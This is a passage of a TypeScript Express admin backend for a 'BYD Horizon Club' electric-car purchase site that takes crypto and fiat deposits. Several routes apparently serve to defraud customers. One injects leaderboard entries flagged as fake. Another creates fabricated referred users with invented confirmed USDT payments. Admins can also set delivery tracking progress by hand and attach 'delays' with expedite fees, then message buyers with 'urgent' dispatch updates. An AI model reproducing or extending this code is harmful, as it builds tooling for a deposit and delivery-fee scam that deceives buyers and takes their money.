  const pendingKyc = (await db.get("SELECT COUNT(*) as count FROM users WHERE kyc_status = 'pending'")).count;
  const confirmedPayments = await db.all("SELECT amount, currency, method FROM payments WHERE status = 'confirmed'");
  let totalRevenue = 0;
  let cryptoRev = 0;
  let fiatRev = 0;
  for (const p of confirmedPayments) {
    totalRevenue += p.amount;
    if (p.method === 'crypto') cryptoRev += p.amount;
    else fiatRev += p.amount;
  }
  const logs = await getAdminLogs();
  const recentSignups = await db.all("SELECT id, name, email, created_at FROM users ORDER BY id DESC LIMIT 5");
  const dailyCheckins = await db.get("SELECT COUNT(*) as count FROM daily_checkins WHERE checkin_date = ?", [new Date().toISOString().split("T")[0]]);
  res.json({ totalUsers, activeMembers, pendingKyc, totalRevenue, cryptoRevenue: cryptoRev, fiatRevenue: fiatRev, recentSignups, dailyCheckins: dailyCheckins.count, logs: logs.slice(-30) });
});

// 1. User Management
app.get("/api/admin/users", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  const { search, kyc_status, country, membership_tier } = req.query;
  let sql = "SELECT u.*, t.route_index FROM users u LEFT JOIN map_tracking t ON u.id = t.user_id";
  const params: any[] = [];
  const wheres: string[] = [];
  if (search) { wheres.push("(u.name LIKE ? OR u.email LIKE ? OR u.phone LIKE ?)"); params.push(`%${search}%`, `%${search}%`, `%${search}%`); }
  if (kyc_status) { wheres.push("u.kyc_status = ?"); params.push(kyc_status); }
  if (country) { wheres.push("u.country = ?"); params.push(country); }
  if (membership_tier) { wheres.push("u.membership_tier = ?"); params.push(membership_tier); }
  if (wheres.length) sql += " WHERE " + wheres.join(" AND ");
  sql += " ORDER BY u.id DESC";
  const list = await db.all(sql, params);
  res.json(list);
});

app.get("/api/admin/users/csv", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  const list = await db.all("SELECT id, name, email, phone, referral_code, city, country, kyc_status, membership_tier, horizon_points, balance, status, created_at FROM users");
  let csv = "ID,Name,Email,Phone,Referral Code,City,Country,KYC,Tier,Points,Balance,Status,Joined\n";
  for (const u of list) csv += `"${u.id}","${(u.name||'').replace(/"/g,'""')}","${u.email}","${u.phone}","${u.referral_code}","${u.city}","${u.country}","${u.kyc_status}","${u.membership_tier}","${u.horizon_points}","${u.balance}","${u.status}","${u.created_at}"\n`;
  res.setHeader("Content-Type", "text/csv");
  res.setHeader("Content-Disposition", "attachment; filename=byd_horizon_users.csv");
  res.send(csv);
});

app.post("/api/admin/users", authenticateAdmin, async (req: any, res) => {
  const { name, email, phone, password, city, country, membership_tier } = req.body;
  if (!name || !email || !phone || !password || !city) return res.status(400).json({ error: "All required fields." });
  const db = await getDb();
  const existing = await db.get("SELECT id FROM users WHERE email = ?", [email.toLowerCase()]);
  if (existing) return res.status(400).json({ error: "Email already exists." });
  const password_hash = hashPassword(password);
  const code = generateRefCode(name);
  const wallet = generateWalletAddress();
  const result = await db.run("INSERT INTO users (name, email, phone, password_hash, referral_code, crypto_wallet_address, city, country, membership_tier, created_at) VALUES (?,?,?,?,?,?,?,?,?,CURRENT_TIMESTAMP)", [name, email.toLowerCase(), phone, password_hash, code, wallet, city, country || 'US', membership_tier || 'standard']);
  await logAdminAction("Created user", `User ID ${result.lastID} - ${email}`, req.ip, req.adminId);
  res.json({ success: true, userId: result.lastID });
});

app.post("/api/admin/users/:userId/status", authenticateAdmin, async (req: any, res) => {
  const { status } = req.body;
  const db = await getDb();
  await db.run("UPDATE users SET status = ? WHERE id = ?", [status, req.params.userId]);
  await logAdminAction("Changed user status", `User ${req.params.userId} -> ${status}`, req.ip, req.adminId);
  res.json({ success: true });
});

app.post("/api/admin/users/:userId/edit", authenticateAdmin, async (req: any, res) => {
  const { name, email, phone, city, country, crypto_wallet_address, horizon_points, balance, kyc_status, membership_tier, is_incognito, membership_active, is_president_club } = req.body;
  const db = await getDb();
  await db.run("UPDATE users SET name=?, email=?, phone=?, city=?, country=?, crypto_wallet_address=?, horizon_points=?, balance=?, kyc_status=?, membership_tier=?, is_incognito=?, membership_active=?, is_president_club=? WHERE id=?", [name || '', email || '', phone || '', city || '', country || 'US', crypto_wallet_address || '', horizon_points || 0, balance || 0, kyc_status || 'not_submitted', membership_tier || 'standard', is_incognito ? 1 : 0, membership_active ? 1 : 0, is_president_club ? 1 : 0, req.params.userId]);
  await logAdminAction("Edited user", `User ID ${req.params.userId}`, req.ip, req.adminId);
  res.json({ success: true });
});

app.post("/api/admin/users/:userId/reset-password", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  const tempPass = crypto.randomBytes(4).toString("hex").toUpperCase();
  await db.run("UPDATE users SET password_hash = ? WHERE id = ?", [hashPassword(tempPass), req.params.userId]);
  await logAdminAction("Reset user password", `User ID ${req.params.userId}`, req.ip, req.adminId);
  res.json({ success: true, temporary_password: tempPass });
});

app.delete("/api/admin/users/:userId", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  await db.run("DELETE FROM users WHERE id = ?", [req.params.userId]);
  await logAdminAction("Deleted user", `User ID ${req.params.userId}`, req.ip, req.adminId);
  res.json({ success: true });
});

app.get("/api/admin/interactions", authenticateAdmin, async (req: any, res) => {
  try { res.json(await getUserInteractions()); } catch { res.json([]); }
});

// 2. Payment Management
app.get("/api/admin/payments", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  const { method, status, country } = req.query;
  let sql = "SELECT p.*, u.name as username, u.email as useremail FROM payments p JOIN users u ON p.user_id = u.id";
  const params: any[] = [];
  const wheres: string[] = [];
  if (method) { wheres.push("p.method = ?"); params.push(method); }
  if (status) { wheres.push("p.status = ?"); params.push(status); }
  if (country) { wheres.push("p.country = ?"); params.push(country); }
  if (wheres.length) sql += " WHERE " + wheres.join(" AND ");
  sql += " ORDER BY p.id DESC";
  res.json(await db.all(sql, params));
});

app.post("/api/admin/payments/:payId/confirm", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  const payment = await db.get("SELECT * FROM payments WHERE id = ?", [req.params.payId]);
  if (!payment) return res.status(404).json({ error: "Payment not found." });
  if (payment.status !== 'confirmed') {
    await db.run("UPDATE payments SET status = 'confirmed', updated_at = CURRENT_TIMESTAMP WHERE id = ?", [payment.id]);
    const points = Math.floor(payment.amount * 10);
    let updateSql = "UPDATE users SET horizon_points = horizon_points + ?, balance = balance + ?";
    const updateParams: any[] = [points, payment.amount];
    if (payment.type === 'membership') {
      const expiry = new Date(Date.now() + 365 * 86400000).toISOString().split("T")[0];
      updateSql += ", membership_active = 1, membership_expiry = ?";
      updateParams.push(expiry);
    }
    updateSql += " WHERE id = ?";
    updateParams.push(payment.user_id);
    await db.run(updateSql, updateParams);
    // Referral bonus
    const user = await db.get("SELECT referrer_id FROM users WHERE id = ?", [payment.user_id]);
    if (user?.referrer_id) {
      await db.run("INSERT OR IGNORE INTO referrals (referrer_id, referred_user_id, status, reward_amount) VALUES (?,?, 'paid', 50.00)", [user.referrer_id, payment.user_id]);
      await db.run("UPDATE users SET horizon_points = horizon_points + 500 WHERE id = ?", [user.referrer_id]);
    }
    if (payment.type === 'installment') {
      await db.run("UPDATE installments SET total_paid = total_paid + ? WHERE user_id = ? AND status = 'active'", [payment.amount, payment.user_id]);
    }
    // Lottery tickets
    await db.run("INSERT INTO lottery_entries (user_id, tickets, source, month) VALUES (?, 1, 'payment', ?)", [payment.user_id, new Date().toISOString().substring(0, 7)]);
    await db.run("UPDATE users SET lottery_tickets = lottery_tickets + 1 WHERE id = ?", [payment.user_id]);
    await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'payment', 'Payment Confirmed', 'Your payment of $' || ? || ' has been confirmed. +' || ? || ' points awarded!')", [payment.user_id, payment.amount, points]);
    await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'payment', 'Deposit Confirmed', 'Your deposit of $' || ? || ' has been confirmed and credited to your balance.')", [payment.user_id, payment.amount]);
    await logAdminAction("Confirmed payment", `Payment ID ${payment.id} - User ${payment.user_id}`, req.ip, req.adminId);
  }
  res.json({ success: true });
});

app.post("/api/admin/payments/:payId/refund", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  await db.run("UPDATE payments SET status = 'refunded', updated_at = CURRENT_TIMESTAMP WHERE id = ?", [req.params.payId]);
  await logAdminAction("Refunded payment", `Payment ID ${req.params.payId}`, req.ip, req.adminId);
  res.json({ success: true });
});

app.get("/api/admin/payments/export", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  const payments = await db.all("SELECT p.*, u.name as username, u.email as useremail FROM payments p JOIN users u ON p.user_id = u.id ORDER BY p.id DESC");
  let csv = "ID,User,Email,Amount,Currency,Method,Status,Type,TxHash,Country,Created\n";
  for (const p of payments) csv += `"${p.id}","${p.username}","${p.useremail}","${p.amount}","${p.currency}","${p.method}","${p.status}","${p.type}","${p.transaction_hash}","${p.country}","${p.created_at}"\n`;
  res.setHeader("Content-Type", "text/csv");
  res.setHeader("Content-Disposition", "attachment; filename=byd_payments.csv");
  res.send(csv);
});

// Payment Methods Config
app.get("/api/admin/payment-methods", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  res.json(await db.all("SELECT * FROM payment_methods"));
});

app.post("/api/admin/payment-methods/:id", authenticateAdmin, async (req: any, res) => {
  const { enabled, recommended, fee_percent, min_deposit, wallet_address, gas_fee, crypto_bonus_percent } = req.body;
  const db = await getDb();
  await db.run("UPDATE payment_methods SET enabled=?, recommended=?, fee_percent=?, min_deposit=?, wallet_address=?, gas_fee=?, crypto_bonus_percent=? WHERE id=?", [enabled ? 1 : 0, recommended ? 1 : 0, fee_percent, min_deposit, wallet_address, gas_fee, crypto_bonus_percent, req.params.id]);
  await logAdminAction("Updated payment method", `Method ID ${req.params.id}`, req.ip, req.adminId);
  res.json({ success: true });
});

// 3. Vehicle & Fleet Management
app.get("/api/admin/cars", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  const cars = await db.all("SELECT c.*, (SELECT image_url FROM car_images WHERE car_id = c.id AND is_primary = 1 LIMIT 1) as image_url FROM cars c ORDER BY c.id ASC");
  for (const car of cars) {
    car.images = await db.all("SELECT * FROM car_images WHERE car_id = ?", [car.id]);
  }
  res.json(cars);
});

app.post("/api/admin/cars", authenticateAdmin, async (req: any, res) => {
  const { model, year, price, monthly_finance, range_miles, acceleration, battery, description, specs, badge, category, status, is_club_exclusive, rental_price_per_day, image_url } = req.body;
  if (!model || !price) return res.status(400).json({ error: "Model and price required." });
  const db = await getDb();
  const specsJson = specs ? JSON.stringify(specs) : '{}';
  const result = await db.run("INSERT INTO cars (model, year, price, monthly_finance, range_miles, acceleration, battery, description, specs_json, badge, category, status, is_club_exclusive, rental_price_per_day) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)", [model, year || 2026, price, monthly_finance || 0, range_miles || 0, acceleration || '', battery || '', description || '', specsJson, badge || '', category || '', status || 'Available', is_club_exclusive ? 1 : 0, rental_price_per_day || 0]);
  if (image_url) await db.run("INSERT INTO car_images (car_id, image_url, is_primary) VALUES (?, ?, 1)", [result.lastID, image_url]);
  await logAdminAction("Added car", `${model} - ID ${result.lastID}`, req.ip, req.adminId);
  res.json({ success: true, carId: result.lastID });
});

app.post("/api/admin/cars/:id", authenticateAdmin, async (req: any, res) => {
  const { model, year, price, monthly_finance, range_miles, acceleration, battery, description, specs, badge, category, status, is_club_exclusive, rental_price_per_day, is_active } = req.body;
  const db = await getDb();
  const specsJson = specs ? JSON.stringify(specs) : undefined;
  await db.run("UPDATE cars SET model=?, year=?, price=?, monthly_finance=?, range_miles=?, acceleration=?, battery=?, description=?, specs_json=COALESCE(?, specs_json), badge=?, category=?, status=?, is_club_exclusive=?, rental_price_per_day=?, is_active=? WHERE id=?", [model, year || 2026, price, monthly_finance || 0, range_miles || 0, acceleration || '', battery || '', description || '', specsJson, badge || '', category || '', status || 'Available', is_club_exclusive ? 1 : 0, rental_price_per_day || 0, is_active !== undefined ? (is_active ? 1 : 0) : 1, req.params.id]);
  await logAdminAction("Updated car", `Car ID ${req.params.id}`, req.ip, req.adminId);
  res.json({ success: true });
});

app.post("/api/admin/cars/:id/image", authenticateAdmin, async (req: any, res) => {
  const { image_url } = req.body;
  if (!image_url) return res.status(400).json({ error: "Image URL required." });
  const db = await getDb();
  await db.run("INSERT INTO car_images (car_id, image_url) VALUES (?, ?)", [req.params.id, image_url]);
  res.json({ success: true });
});

app.delete("/api/admin/cars/:id", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  await db.run("DELETE FROM cars WHERE id = ?", [req.params.id]);
  await logAdminAction("Deleted car", `Car ID ${req.params.id}`, req.ip, req.adminId);
  res.json({ success: true });
});

// 4. Tracking & Dispatch
app.get("/api/admin/tracking", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  const trackings = await db.all("SELECT t.*, u.name as username, u.email as useremail FROM map_tracking t JOIN users u ON t.user_id = u.id ORDER BY t.last_updated DESC");
  res.json(trackings);
});

app.post("/api/admin/tracking/:userId", authenticateAdmin, async (req: any, res) => {
  const { route_index, current_lat, current_lng, delays_encountered, expedite_paid } = req.body;
  const db = await getDb();
  await db.run("UPDATE map_tracking SET route_index=COALESCE(?,route_index), current_lat=COALESCE(?,current_lat), current_lng=COALESCE(?,current_lng), delays_encountered=COALESCE(?,delays_encountered), expedite_paid=COALESCE(?,expedite_paid), last_updated=CURRENT_TIMESTAMP WHERE user_id=?", [route_index, current_lat, current_lng, delays_encountered, expedite_paid, req.params.userId]);
  await logAdminAction("Updated tracking", `User ${req.params.userId}`, req.ip, req.adminId);
  // Dispatch notification
  if (route_index !== undefined) {
    const user = await db.get("SELECT name, email FROM users WHERE id = ?", [req.params.userId]);
    const progress = Math.round((route_index / 100) * 100);
    await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'dispatch', 'Vehicle Update', 'Your vehicle is now ' || ? || '% complete on its journey!')", [req.params.userId, progress]);
    if (route_index >= 100) {
      await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'tracking', 'Delivery Complete', 'Your vehicle has been delivered! Congratulations!')", [req.params.userId]);
    } else if (route_index >= 50) {
      await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'tracking', 'In Transit', 'Your vehicle is over halfway to its destination!')", [req.params.userId]);
    } else if (route_index > 0) {
      await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'tracking', 'Delivery Started', 'Your vehicle delivery has begun. Track it in real-time!')", [req.params.userId]);
    }
  }
  res.json({ success: true });
});

app.post("/api/admin/tracking/:userId/dispatch", authenticateAdmin, async (req: any, res) => {
  const { message } = req.body;
  if (!message) return res.status(400).json({ error: "Message required." });
  const db = await getDb();
  await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'dispatch', 'Dispatch Notification', ?)", [req.params.userId, message]);
  await logAdminAction("Sent dispatch notification", `User ${req.params.userId}`, req.ip, req.adminId);
  res.json({ success: true });
});

// Urgent tracking messages for users
app.get("/api/tracking/urgent-messages", authenticateUser, async (req: any, res) => {
  const db = await getDb();
  const msgs = await db.all("SELECT * FROM tracking_urgent_updates WHERE user_id = ? ORDER BY id DESC LIMIT 10", [req.user.id]);
  const notifs = await db.all("SELECT id, message, sent_at as created_at FROM notifications WHERE user_id = ? AND type IN ('dispatch','tracking') ORDER BY id DESC LIMIT 10", [req.user.id]);
  const combined = [...msgs, ...notifs].sort((a: any, b: any) => new Date(b.created_at || b.sent_at || 0).getTime() - new Date(a.created_at || a.sent_at || 0).getTime()).slice(0, 10);
  res.json(combined);
});

app.post("/api/admin/tracking/urgent", authenticateAdmin, async (req: any, res) => {
  const { user_id, message } = req.body;
  if (!user_id || !message) return res.status(400).json({ error: "user_id and message required." });
  const db = await getDb();
  await db.run("INSERT INTO tracking_urgent_updates (user_id, message) VALUES (?, ?)", [user_id, message]);
  await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'dispatch', 'Urgent Update from Admin', ?)", [user_id, message]);
  await logAdminAction("Sent urgent tracking update", `User ${user_id}`, req.ip, req.adminId);
  res.json({ success: true });
});

// Delays management
app.get("/api/admin/delays", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  res.json(await db.all("SELECT * FROM delays"));
});

app.post("/api/admin/delays", authenticateAdmin, async (req: any, res) => {
  const { name, duration_days, trigger_after_km, expedite_fee } = req.body;
  if (!name) return res.status(400).json({ error: "Name required." });
  const db = await getDb();
  await db.run("INSERT INTO delays (name, duration_days, trigger_after_km, expedite_fee) VALUES (?,?,?,?)", [name, duration_days || 1, trigger_after_km || 50, expedite_fee || 49]);
  await logAdminAction("Added delay", name, req.ip, req.adminId);
  res.json({ success: true });
});

app.post("/api/admin/delays/:id/update", authenticateAdmin, async (req: any, res) => {
  const { name, duration_days, trigger_after_km, expedite_fee } = req.body;
  const db = await getDb();
  await db.run("UPDATE delays SET name=?, duration_days=?, trigger_after_km=?, expedite_fee=? WHERE id=?", [name, duration_days, trigger_after_km, expedite_fee, req.params.id]);
  res.json({ success: true });
});

app.delete("/api/admin/delays/:id", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  await db.run("DELETE FROM delays WHERE id = ?", [req.params.id]);
  res.json({ success: true });
});

// 5. Referral & Rewards
app.get("/api/admin/referrals", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  res.json(await db.all("SELECT r.*, u1.name as referrer_name, u2.name as referred_name FROM referrals r JOIN users u1 ON r.referrer_id = u1.id JOIN users u2 ON r.referred_user_id = u2.id ORDER BY r.id DESC"));
});

app.post("/api/admin/leaderboard", authenticateAdmin, async (req: any, res) => {
  const { name, count } = req.body;
  if (!name) return res.status(400).json({ error: "Name required." });
  const db = await getDb();
  await db.run("INSERT INTO leaderboard (name, count, is_fake) VALUES (?, ?, 1) ON CONFLICT(name) DO UPDATE SET count = ?", [name, count, count]);
  await logAdminAction("Injected leaderboard", `${name}: ${count}`, req.ip, req.adminId);
  res.json({ success: true });
});

app.post("/api/admin/referrals/inject", authenticateAdmin, async (req: any, res) => {
  const { referrer_id, name, email, paymentCount } = req.body;
  if (!referrer_id || !name || !email) return res.status(400).json({ error: "Referrer ID, Name, Email required." });
  const db = await getDb();
  const refCode = generateRefCode(name);
  const wallet = generateWalletAddress();
  const result = await db.run("INSERT INTO users (name, email, password_hash, phone, city, referral_code, referrer_id, crypto_wallet_address, kyc_status) VALUES (?,?,?,?,?,?,?,?,'verified')", [name, email, 'fake_hash', '+1 (555) 000-0000', 'Remote', refCode, referrer_id, wallet]);
  await db.run("INSERT INTO referrals (referrer_id, referred_user_id, status, reward_amount) VALUES (?,?,?,50.00)", [referrer_id, result.lastID, (paymentCount || 0) >= 2 ? 'paid' : 'pending']);
  for (let i = 0; i < (paymentCount || 0); i++) {
    await db.run("INSERT INTO payments (user_id, amount, currency, method, status, type, transaction_hash) VALUES (?,?,?,'crypto','confirmed','installment',?)", [result.lastID, 150, 'USDT', 'BYD-TX-INJECT-' + crypto.randomBytes(8).toString("hex").toUpperCase()]);
  }
  await logAdminAction("Injected referral", `Referrer ${referrer_id} -> ${name}`, req.ip, req.adminId);
  res.json({ success: true });
});

app.post("/api/admin/award-points", authenticateAdmin, async (req: any, res) => {
  const { user_id, points, reason } = req.body;
  if (!user_id || !points) return res.status(400).json({ error: "User ID and points required." });
  const db = await getDb();
  await db.run("UPDATE users SET horizon_points = horizon_points + ? WHERE id = ?", [points, user_id]);
  await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'reward', 'Points Awarded', 'Admin awarded ' || ? || ' points. Reason: ' || ?)", [user_id, points, reason || 'Admin bonus']);
  await logAdminAction("Awarded points", `User ${user_id}: +${points} pts`, req.ip, req.adminId);
  res.json({ success: true });
});

// 6. Content & Media
app.get("/api/admin/blogs", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  res.json(await db.all("SELECT * FROM blog_posts ORDER BY published_at DESC"));
});

app.post("/api/admin/blogs", authenticateAdmin, async (req: any, res) => {
  const { title, content, image_url } = req.body;
  if (!title || !content) return res.status(400).json({ error: "Title and content required." });
  const db = await getDb();
  await db.run("INSERT INTO blog_posts (title, content, image_url) VALUES (?,?,?)", [title, content, image_url || 'https://images.unsplash.com/photo-1549399542-7e3f8b79c341?auto=format&fit=crop&w=800&q=80']);
  await logAdminAction("Created blog post", title, req.ip, req.adminId);
  res.json({ success: true });
});

app.post("/api/admin/blogs/:id", authenticateAdmin, async (req: any, res) => {
  const { title, content, image_url } = req.body;
  const db = await getDb();
  await db.run("UPDATE blog_posts SET title=?, content=?, image_url=? WHERE id=?", [title, content, image_url, req.params.id]);
  res.json({ success: true });
});

app.delete("/api/admin/blogs/:id", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  await db.run("DELETE FROM blog_posts WHERE id = ?", [req.params.id]);
  res.json({ success: true });
});

app.get("/api/admin/comments", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  res.json(await db.all("SELECT bc.*, u.name as username, bp.title as post_title FROM blog_comments bc JOIN users u ON bc.user_id = u.id JOIN blog_posts bp ON bc.post_id = bp.id ORDER BY bc.id DESC"));
});

app.post("/api/admin/comments/:id/:action", authenticateAdmin, async (req: any, res) => {
  const { action } = req.params;
  const db = await getDb();
  if (action === 'approve') await db.run("UPDATE blog_comments SET status = 'approved' WHERE id = ?", [req.params.id]);
  else if (action === 'delete') await db.run("DELETE FROM blog_comments WHERE id = ?", [req.params.id]);
  res.json({ success: true });
});

// Carousel slides
app.get("/api/admin/carousel", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  res.json(await db.all("SELECT * FROM carousel_slides ORDER BY order_num ASC"));
});

app.post("/api/admin/carousel", authenticateAdmin, async (req: any, res) => {
  const { image_url, title, subtitle, cta_text, cta_link, order_num } = req.body;
  if (!image_url || !title) return res.status(400).json({ error: "Image URL and title required." });
  const db = await getDb();
  await db.run("INSERT INTO carousel_slides (image_url, title, subtitle, cta_text, cta_link, order_num) VALUES (?,?,?,?,?,?)", [image_url, title, subtitle || '', cta_text || '', cta_link || '', order_num || 0]);
  res.json({ success: true });
});

app.delete("/api/admin/carousel/:id", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  await db.run("DELETE FROM carousel_slides WHERE id = ?", [req.params.id]);
  res.json({ success: true });
});

// Testimonials
app.get("/api/admin/testimonials", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  res.json(await db.all("SELECT * FROM testimonials ORDER BY id DESC"));
});

app.post("/api/admin/testimonials", authenticateAdmin, async (req: any, res) => {
  const { name, photo_url, quote } = req.body;
  if (!name || !quote) return res.status(400).json({ error: "Name and quote required." });
  const db = await getDb();
  await db.run("INSERT INTO testimonials (name, photo_url, quote) VALUES (?,?,?)", [name, photo_url || 'https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?auto=format&fit=crop&w=100&q=80', quote]);
  res.json({ success: true });
});

app.delete("/api/admin/testimonials/:id", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  await db.run("DELETE FROM testimonials WHERE id = ?", [req.params.id]);
  res.json({ success: true });
});

// Webcams
app.get("/api/webcams", async (req, res) => {
  const db = await getDb();
  res.json(await db.all("SELECT * FROM webcam_sources WHERE is_active = 1 ORDER BY id ASC"));
});

app.get("/api/admin/webcams", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  res.json(await db.all("SELECT * FROM webcam_sources ORDER BY id ASC"));
});

app.post("/api/admin/webcams", authenticateAdmin, async (req: any, res) => {
  const { name, video_url, stream_url, thumbnail_url } = req.body;
  const url = video_url || stream_url;
  if (!name || !url) return res.status(400).json({ error: "Name and video URL required." });
  const db = await getDb();
  await db.run("INSERT INTO webcam_sources (name, video_url, thumbnail_url) VALUES (?,?,?)", [name, url, thumbnail_url || '']);
  res.json({ success: true });
});

app.post("/api/admin/webcams/:id", authenticateAdmin, async (req: any, res) => {
  const { name, video_url, thumbnail_url, is_active } = req.body;
  const db = await getDb();
  await db.run("UPDATE webcam_sources SET name=?, video_url=?, thumbnail_url=?, is_active=? WHERE id=?", [name, video_url, thumbnail_url, is_active ? 1 : 0, req.params.id]);
  res.json({ success: true });
});

app.delete("/api/admin/webcams/:id", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  await db.run("DELETE FROM webcam_sources WHERE id = ?", [req.params.id]);
  res.json({ success: true });
});

// 7. Gamification
app.get("/api/admin/gamification", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  res.json(await db.all("SELECT * FROM gamification_config"));
});

app.post("/api/admin/gamification/:key", authenticateAdmin, async (req: any, res) => {
  const { enabled, config_json } = req.body;
  const db = await getDb();
  await db.run("UPDATE gamification_config SET enabled=?, config_json=? WHERE feature_key=?", [enabled ? 1 : 0, config_json || '{}', req.params.key]);
  res.json({ success: true });
});

// Quiz questions
app.get("/api/admin/quiz-questions", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  res.json(await db.all("SELECT * FROM quiz_questions ORDER BY order_num ASC"));
});

app.post("/api/admin/quiz-questions", authenticateAdmin, async (req: any, res) => {
  const { question, options, recommended_car, order_num } = req.body;
  const db = await getDb();
  await db.run("INSERT INTO quiz_questions (question, options, recommended_car, order_num) VALUES (?,?,?,?)", [question, JSON.stringify(options), recommended_car, order_num || 0]);
  res.json({ success: true });
});

app.delete("/api/admin/quiz-questions/:id", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  await db.run("DELETE FROM quiz_questions WHERE id = ?", [req.params.id]);
  res.json({ success: true });
});

// 8. Notifications & Email
app.post("/api/admin/email/dispatch", authenticateAdmin, async (req: any, res) => {
  const { subject, body, filter_tier, filter_country } = req.body;
  if (!subject || !body) return res.status(400).json({ error: "Subject and body required." });
  const db = await getDb();
  let users: any[];
  if (filter_tier) users = await db.all("SELECT id, name, email FROM users WHERE membership_tier = ?", [filter_tier]);
  else if (filter_country) users = await db.all("SELECT id, name, email FROM users WHERE country = ?", [filter_country]);
  else users = await db.all("SELECT id, name, email FROM users");
  for (const u of users) {
    await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'email', ?, ?)", [u.id, subject, body + '\n\n- BYD Horizon Club Team']);
    await db.run("INSERT INTO email_logs (user_id, template, status) VALUES (?, ?, 'sent')", [u.id, subject]);
  }
  await logAdminAction("Dispatched mass email", `"${subject}" to ${users.length} users`, req.ip, req.adminId);
  res.json({ success: true, userCount: users.length });
});

app.post("/api/admin/email/send-individual", authenticateAdmin, async (req: any, res) => {
  const { user_id, subject, body } = req.body;
  if (!user_id || !subject || !body) return res.status(400).json({ error: "User ID, subject, body required." });
  const db = await getDb();
  await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'email', ?, ?)", [user_id, subject, body]);
  await db.run("INSERT INTO email_logs (user_id, template, status) VALUES (?, ?, 'sent')", [user_id, subject]);
  const user = await db.get("SELECT name FROM users WHERE id = ?", [user_id]);
  await logAdminAction("Sent individual email", `${user?.name} (ID ${user_id}): "${subject}"`, req.ip, req.adminId);
  res.json({ success: true });
});

app.get("/api/admin/email/logs", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  res.json(await db.all("SELECT el.*, u.name, u.email FROM email_logs el JOIN users u ON el.user_id = u.id ORDER BY el.id DESC LIMIT 100"));
});

// 9. System Settings
app.get("/api/admin/settings", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  const rows = await db.all("SELECT * FROM system_settings ORDER BY key ASC");
  const settings: Record<string, string> = {};
  for (const r of rows) settings[r.key] = r.value;
  if (fs.existsSync(SETTINGS_FILE)) {
    try { Object.assign(settings, JSON.parse(fs.readFileSync(SETTINGS_FILE, "utf8"))); } catch {}
  }
  res.json(settings);
});

app.post("/api/admin/settings", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  const updates = req.body;
  for (const [key, value] of Object.entries(updates)) {
    await db.run("INSERT OR REPLACE INTO system_settings (key, value, updated_at) VALUES (?, ?, CURRENT_TIMESTAMP)", [key, String(value)]);
  }
  // Handle settings.json for backward compat
  if (updates.escrow_wallet || updates.app_name) {
    let fileSettings: Record<string, string> = {};
    if (fs.existsSync(SETTINGS_FILE)) {
      try { fileSettings = JSON.parse(fs.readFileSync(SETTINGS_FILE, "utf8")); } catch {}
    }
    if (updates.escrow_wallet) fileSettings.escrow_wallet = updates.escrow_wallet;
    if (updates.app_name) fileSettings.app_name = updates.app_name;
    fs.writeFileSync(SETTINGS_FILE, JSON.stringify(fileSettings, null, 2));
  }
  await logAdminAction("Updated settings", `Keys: ${Object.keys(updates).join(', ')}`, req.ip, req.adminId);
  res.json({ success: true });
});

app.post("/api/admin/maintenance", authenticateAdmin, async (req: any, res) => {
  const { enabled } = req.body;
  await setSetting('maintenance_mode', enabled ? 'true' : 'false');
  await logAdminAction("Toggled maintenance mode", enabled ? 'ON' : 'OFF', req.ip, req.adminId);
  res.json({ success: true });
});

// Notification email endpoint
app.post("/api/settings/notification-email", authenticateUser, async (req: any, res) => {
  const { email } = req.body;
  if (!email) return res.status(400).json({ error: "Email required." });
  await setSetting(`notification_email_${req.user.id}`, email);
  res.json({ success: true, message: "Notification email updated." });
});

// Admin shipment notification email
app.post("/api/admin/shipment/notify/:userId", authenticateAdmin, async (req: any, res) => {
  const { subject, message } = req.body;
  if (!subject || !message) return res.status(400).json({ error: "Subject and message required." });
  const db = await getDb();
  const user = await db.get("SELECT name, email FROM users WHERE id = ?", [req.params.userId]);
  if (!user) return res.status(404).json({ error: "User not found." });
  await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'email', ?, ?)", [req.params.userId, subject, message]);
  await db.run("INSERT INTO email_logs (user_id, template, status) VALUES (?, ?, 'sent')", [req.params.userId, subject]);
